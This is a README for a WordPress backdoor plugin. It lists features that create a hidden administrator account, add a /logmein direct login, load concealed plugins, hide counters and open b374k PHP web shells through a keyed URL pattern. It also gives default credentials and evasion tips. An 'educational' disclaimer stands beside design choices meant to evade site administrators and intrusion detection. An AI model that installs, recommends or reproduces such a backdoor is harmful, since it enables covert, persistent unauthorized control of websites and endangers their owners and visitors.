# Wordpress Backdoor Plugin

## Heads up

This project is maintained and likely will be for quite some time since I'm not fairly busy with other projects. If you want to update the plugin to work if something is broken, feel free to submit a PR.

## Contributors
MirrorORG 
Thanks To IRDeNial

## Tested On
Version All WP Versions Till 24/1/2024

**License**: GPLv3 or later

# Description

This plugin is strictly for educational and rescue purposes only.  Misuse of this plugin is caused by the intention of the user, not at the contributors.  The contributors take no responsibility for any misuse of this plugin.

This plugin does the following:
* Direct login link by typing /logmein after domain name
* Creates an administrator user
* Installs all plugins located in the ./plugins/ folder.
* Hides said administrator user from the user control area
* Hides the backdoor plugin & all plugins loaded by it
* Hides the plugin and user counters
* Implements a method to access the b374k PHP shells via URL

# Installation

1. Download the latest release from here: 
    * https://github.com/IRDeNial/Wordpress-Backdoor-Plugin/releases
2. Modify the plugin as necessary.  Future versions will have an easier method of controlling access.
    * Backdoor username, password, and key are all stored in the __construct() method of the plugin.  Search for `$this->username =`, `$this->password =`, and `$this->key =` in order to find the individual things that need to be configured.  Again, this will change in the future.
2. Upload the plugin files to the `/wp-content/plugins/wp-sph/` directory (If it does not exist, create it), or install the plugin through the WordPress plugins screen directly if you want to keep everything default.
3. Login as the configured user.


# Frequently Asked Questions

* **What is the default direct login link?**
    * domainname.com/logmein

* **What is the default login?**
    * Username: id
    * Password: pw

* **What is the default key?**
    * key

* **How do I access a PHP shell?**
    * To access, for example, the default b374k shell on http://localhost.com, you would navigate to this url:    
        * http://localhost.com/loadshell-b374k-key
    * The pattern for this is `loadshell-(SHELLNAME)-(KEY)`.

* **Does the backdoor user show up for other admins?**
    * No, the backdoor user is only visible to the backdoor user.  All other users will not see the backdoor user.

* **Do any users see my installed plugins?**
    * No, the plugins installed by this plugin are hidden to all users except the backdoor user.  Upon deactivation, these plugins will be deleted to allow for less intrusion detection.

* **If I deactivate the plugin, will I still have access to the website?**
    * No, upon deactivation, the plugin won't remove the backdoor user. so it is wise to delete the plugin files, excluding the plugin itself, before disabling.  This will be changed in a future version.

# Contribution
    * Any contributor will be added to the contributors list at the top of this document.
    * Please pull from the development branch in order to get the latest code.
    * All contributors are to fully document all changes to code in order to be considered for the next release.
    * Contact @mashraf1997 with any questions

# Changelog

* **1.0**
    * Backdoor user not deleted on deactivation
    * Added in dynamic shell inclusion from the ./sh/ folder.  Allows for users of plugin to use whatever shell they prefer instead of specifically b374k.
    * Changed to class layout for easier modification/use and less chance of conflict
    * b374k shell inclusion by accessing it directly through plugin folder
    * Made backdoor user creation routines
    * Made backdoor user hidden from all users
    * Made it forcefully activate if it is installed WP Downloader and keep it activated

# Roadmap
* Allow for custom code inclusion that takes advantage of the WP_SPH class & methods.
* Write a better display file method that's easier to use
* Implement an admin menu/area that only the backdoor user can access for easy manipulation of the backdoor.